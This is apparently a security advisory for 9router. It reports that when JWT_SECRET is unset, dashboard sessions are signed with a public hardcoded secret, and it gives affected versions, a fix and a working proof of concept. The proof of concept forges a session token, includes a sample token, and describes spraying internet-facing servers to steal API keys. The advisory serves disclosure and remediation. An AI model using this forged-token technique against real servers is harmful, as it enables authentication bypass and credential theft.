summary: "9router's Hardcoded Default fallback JWT Secret  Allows Authentication Bypass\n###\
  \ Summary\n9router uses a publicly known hardcoded string `\"9router-default-secret-change-me\"\
  ` as the fallback of JWT secret for all Dashboard session JWTs when the `JWT_SECRET` environment\
  \ variable is not set. Because this secret is committed in the public repository and unchanged\
  \ across all releases, any unauthenticated remote attacker can forge a valid `auth_token`\
  \ cookie and gain full access to dashboard and api (If JWT_SECRET is not set on server) .\
  \ This vulnerable affected so many public 9router server\n### Details\n| Versions | File |\
  \ Note |\n|---|---|---|\n| `>= 0.2.21, <= 0.4.30` | `src/app/api/auth/login/route.js` + `src/middleware.js`\
  \ | Introduced in commit `23cfb19` |\n| `>= 0.4.31, <= 0.4.41` | `src/lib/auth/dashboardSession.js`\
  \ | Relocated by OIDC refactor `c3d91b0`, secret unchanged |\n\nVulnerable Code\n\n**v0.2.21\
  \ – v0.4.30** — `src/app/api/auth/login/route.js` and `src/middleware.js`:\n\n```js\nconst\
  \ SECRET = new TextEncoder().encode(\n  process.env.JWT_SECRET || \"9router-default-secret-change-me\"\
  \n);\n```\n\n**v0.4.31 – v0.4.41 (current)** — `src/lib/auth/dashboardSession.js` (centralized\
  \ via OIDC refactor, commit `c3d91b0`):\n\n```js\nconst SECRET = new TextEncoder().encode(\n\
  \  process.env.JWT_SECRET || \"9router-default-secret-change-me\"\n);\n```\nThe fallback string\
  \ was introduced in commit `23cfb19` (2026-01-09) and has never been removed. The OIDC refactor\
  \ in `c3d91b0` only relocated it to a shared module . This vulnerability has existed since\
  \ 9router first introduced authentication.\n### PoC\n**Step 1.** Craft a JWT signed with the\
  \ known default secret:\n```js\nimport { SignJWT } from \"jose\";\n\nconst SECRET = new TextEncoder().encode(\"\
  9router-default-secret-change-me\");\n\nconst token = await new SignJWT({ authenticated: true\
  \ })\n  .setProtectedHeader({ alg: \"HS256\" })\n  .setIssuedAt()\n  .setExpirationTime(\"\
  36y\")\n  .sign(SECRET);\n\nconsole.log(token); // example a valid auth_token=eyJhbGciOiJIUzI1NiJ9.eyJhdXRoZW50aWNhdGVkIjp0cnVlLCJpYXQiOjE3Nzg3Njk4NTYsImV4cCI6MjkxNDg0MzQ1Nn0.enMLEqYZKFuzxkmRH6qd3E-Ub-20wOjmiEfP4KyIG6w\n\
  ```\n**Step 2.** Set the forged token as the `auth_token` cookie. And access the `http://<target>/dashboard`\
  \ - completely authentication bypass \n\n### Attack Scenario:\n- Attacker can use this JWT\
  \ to spray to all server that they found in the internet and gain dashboard access if a server\
  \ doesn't set JWT_SECRET\n- Then they can steal valuable API Key , Auth Token via http://\
  \ target /api/settings/database \n\n\n### Impact\n- A successful attack grants attacker **full\
  \ API Key, Auth Token** that 9router hold\n- They can **read** 9router apikey, **change**\
  \ 9router password ,shutdown 9router, **Modify** everything\n- **Pivot** via the MCP stdio→SSE\
  \ bridge exposed at `/api/mcp/`  (exploit CVE-2026-46339)\n\n## Recommended Fix\n\n**Require**\
  \ `JWT_SECRET` at startup and fail fast rather than falling back silently:\n\n```js\nconst\
  \ jwtSecret = process.env.JWT_SECRET;\nif (!jwtSecret) {\n  throw new Error(\n    \"JWT_SECRET\
  \ environment variable is not set. \" +\n    \"Generate one with: openssl rand -hex 32\"\n\
  \  );\n}\nconst SECRET = new TextEncoder().encode(jwtSecret);\n```\n\nAlternatively, auto-generate\
  \ a random secret on first boot and persist it to the data directory — but **never** fall\
  \ back to a publicly known constant."
